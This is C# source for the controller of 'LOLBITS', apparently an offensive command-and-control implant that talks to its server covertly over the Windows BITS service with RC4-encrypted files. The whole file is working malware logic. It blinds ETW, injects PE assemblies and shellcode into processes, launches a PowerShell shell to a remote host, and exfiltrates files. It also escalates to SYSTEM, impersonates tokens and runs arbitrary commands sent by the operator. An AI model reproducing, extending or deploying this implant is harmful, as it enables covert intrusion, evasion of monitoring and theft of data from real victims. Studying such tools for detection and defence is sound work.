using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using LOLBITS.Loading;
using LOLBITS.TokenManagement;
using Newtonsoft.Json;
using BITS = BITSReference2_5;

namespace LOLBITS.Controlling
{
    public class Controller
    {
        private const string ContId = "7061796c676164";
        private readonly string _p;
        private string _id;
        private string _auth;
        private string[] _restoreKeys;
        private readonly string _tempPath;
        private readonly TokenManager _tokenManager;
        private readonly Jobs _jobsManager;
        private readonly SysCallManager _sysCall;

        public Controller(string id, string url,string password)
        {
            _id = id;
            _p = password;
            _jobsManager = new Jobs(url);
            _sysCall = new SysCallManager();
            _tokenManager = new TokenManager(_sysCall);

            _tempPath = Environment.GetEnvironmentVariable("temp") ?? @"C:\Windows\Temp\";
        }

        public string GetPassword()
        {
            return _p;
        }

        public void Start()
        {

            Utils.handleETW(_sysCall);

            const string startBits = "sc start BITS";
            Utils.ExecuteCommand(startBits, _sysCall);
            Thread.Sleep(500);
            var filePath = _tempPath + @"\" + _id;

            if (!TryInitialCon(filePath)) return;

            var file = GetEncryptedFileContent(filePath, out var unused);
            _id = file.NextId;
            _auth = file.NextAuth;
            _restoreKeys = file.Commands; 
            var domain = Environment.GetEnvironmentVariable("userdomain");
            var user = Environment.GetEnvironmentVariable("username");
            var response = new Response(domain + @"\" + user, _auth);
            filePath = _tempPath + @"\" + _id + ".txt";
            EncryptResponseIntoFile(filePath, response);

            _jobsManager.Send(_id, filePath);


            Loop();
                
        }

        private void Loop()
        {
            var exit = false;

            while (!exit)
            {
                var filePath = _tempPath + @"\" + _id;
                var headers = "reqId: " + _auth;

                Console.WriteLine("next: " + _id);

                if (_jobsManager.Get(_id, filePath, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    var file = GetEncryptedFileContent(filePath, out var unused);

                    _id = file.NextId;
                    _auth = file.NextAuth;
                    Console.WriteLine("Id: " + _id);
                    Console.WriteLine("Auth: " + _auth);

                    if (file.Commands.Length > 0)
                        DoSomething(file);
                    
                    Thread.Sleep(1000);
                }
                else
                {
                    if (_restoreKeys.Length > 0)
                    {
                        _auth = _restoreKeys[_restoreKeys.Length - 1];
                        Array.Resize(ref _restoreKeys,_restoreKeys.Length - 1);
                    }
                    else
                        exit = true;
                }
            }
        }

        private void DoSomething(Content file)
        {
            var rps = "";

            try
            {
                switch (file.Commands[0])
                {
                    case "inject_pe":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                try
                                {
                                    var pe = LoadPE(fileP);
                                    var method = file.Commands[1];
                                    var args = "";

                                    for (var i = 2; i < file.Commands.Length; i++)
                                    {
                                        args += file.Commands[i];
                                        if (i < file.Commands.Length)
                                            args += " ";
                                    }

                                    var arguments = new string[] { args };

                                    LauncherPE.Main(method, arguments, pe);
                                    rps = "PE injected!";
                                }
                                catch (Exception)
                                {
                                    rps = "ERR:Fatal error occurred while trying to inject the dll.\n";
                                }
                            }
                            else
                            {
                                rps = "ERR:Dll not found!\n";
                            }

                            break;
                        }

                    case "inject_shellcode":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
                            var pid = -1;
                            if (file.Commands.Length >= 2)
                                pid = int.Parse(file.Commands[1]);

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                byte[] sh;
                                GetEncryptedFileContent(fileP, out sh);

                                try
                                {
                                    LauncherShellCode.Main(sh, _sysCall, pid);
                                    rps = "Shellcode injected!\n";
                                }
                                catch (Exception)
                                {
                                    rps = "ERR:Fatal error occurred while trying to inject shellCode.\n";
                                }
                            }
                            else
                            {
                                rps = "ERR:Shellcode file not found!\n";
                            }

                            break;
                        }

                    case "powershell":
                        {
                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi", _sysCall);

                            if (rps.Contains("hi"))
                            {
                                LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
                                rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";
                            }
                            else
                            {
                                rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
                            }

                            break;
                        }

                    case "send":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                File.Copy(fileP, file.Commands[1], true);
                                rps = "Dowload finished.\n";
                            }
                            else
                            {
                                rps = "ERR:Download failed!\n";
                            }

                            break;
                        }
                    case "exfiltrate":
                        {
                            if (File.Exists(file.Commands[1]))
                            {
                                if (_jobsManager.Send(file.Commands[2], file.Commands[1]))
                                {
                                    rps = "Exfiltration succeed.\n";

                                }
                                else
                                    rps = "ERR:Exfiltration failed!\n";
                            }
                            else
                                rps = "ERR:File to exfiltrate not found!\n";

                            break;
                        }
                    case "getsystem":
                        {
                            if (Utils.IsHighIntegrity(_sysCall))
                                rps = _tokenManager.GetSystem(_sysCall) ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                            else
                                rps = "ERR:Process failed! Is this process running with high integrity level?\n";

                            break;
                        }

                    case "rev2self":
                        {
                            TokenManager.Rev2Self();
                            rps = "Welcome back.\n";

                            break;
                        }

                    case "runas":
                        {
                            string user = "", domain = "", password = "";
                            var userData = file.Commands[1].Split('\\');

                            if (userData.Length == 1)
                            {
                                domain = ".";
                                user = userData[0];
                            }
                            else
                            {
                                domain = userData[0];
                                user = userData[1];
                            }

                            password = file.Commands[2];

                            rps = TokenManager.RunAs(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";

                            break;
                        }

                    case "list":
                        {
                            rps = GetProcessInfo();
                            break;
                        }

                    case "impersonate":
                        {
                            try
                            {
                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1])))
                                    rps = "Impersonation achieved!\n";
                                else
                                    rps = "ERR: Not enough privileges!\n";
                            }
                            catch
                            {
                                rps = "ERR: Impersonation failed!\n";
                            }

                            break;
                        }

                    case "exit":
                        {
                            Environment.Exit(0);
                            break;
                        }

                    default:
                        {
                            rps = Utils.ExecuteCommand(file.Commands[0], _sysCall);
                            break;
                        }
                }
            } 
            catch
            {
                rps = "ERR: Something went wrong!";
            }

            var response = new Response(rps, _auth);
            var filePath = _tempPath + @"\" + _id + ".txt";
            EncryptResponseIntoFile(filePath, response);
            TrySend(filePath);
        }

        private static string GetProcessInfo()
        {
            var output = "\n";
            output = string.Concat(output, $"{"NAME",30}|{"PID",10}|{"ACCOUNT",20}|\n");

            foreach (var process in Process.GetProcesses())
            {
                var name = process.ProcessName;
                var processId = process.Id;

                output = string.Concat(output, $"{name,30}|{processId,10}|{GetProcessOwner(processId),20}|\n");
            }

            return output;
        }

        private static string GetProcessOwner (int processId)
        {
            var query = "Select * From Win32_Process Where ProcessID = " + processId;
            var moSearcher = new ManagementObjectSearcher(query);
            var moCollection = moSearcher.Get();

            foreach (var o in moCollection)
            {
                var mo = (ManagementObject) o;
                var args = new string[] { string.Empty };
                var returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                if (returnVal == 0)
                    return args[0];
            }

            return "UNKNOWN";
        }
        private bool TrySend(string filePath)
        {
            var cont = 0;

            while (cont < 5)
            {
                if (_jobsManager.Send(_id, filePath))
                    return true;

                ++cont;
            }

            return false;
        }

        private bool TryInitialCon(string filePath)
        {
            var cont = 0;
            while (cont < 5)
            {
                if(_jobsManager.Get(_id, filePath, null,BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                    return true;

                ++cont;
            }

            return false;
        }

        private void EncryptResponseIntoFile(string filePath, Response response)
        {
            var jsonResponse = JsonConvert.SerializeObject(response);
            var contentDecrypted = Encoding.UTF8.GetBytes(jsonResponse);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var contentEncrypted = Rc4.Encrypt(xKey, contentDecrypted);
            var hexadecimal = BiteArrayToHex.Convert(contentEncrypted);
            var fileContent = Zipper.Compress(hexadecimal);

            File.WriteAllText(filePath, fileContent);
        }

        private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
        {
            var fileStr = File.ReadAllText(filePath);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var hexadecimal = Zipper.Decompress(fileStr);
            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal); 
            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);

            decrypted = contentDecrypted;

            var contentEncoded = Encoding.UTF8.GetString(contentDecrypted);

            try
            {
                var final = JsonConvert.DeserializeObject<Content>(contentEncoded);
                return final;
            }
            catch
            {
                return null;
            }
        }

        private Assembly LoadPE(string filePath)
        {
            var fileStr = File.ReadAllText(filePath);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var hexadecimal = Zipper.Decompress(fileStr);
            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal);
            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);

            var pe = Assembly.Load(contentDecrypted);

            return pe;
        }
    }
}
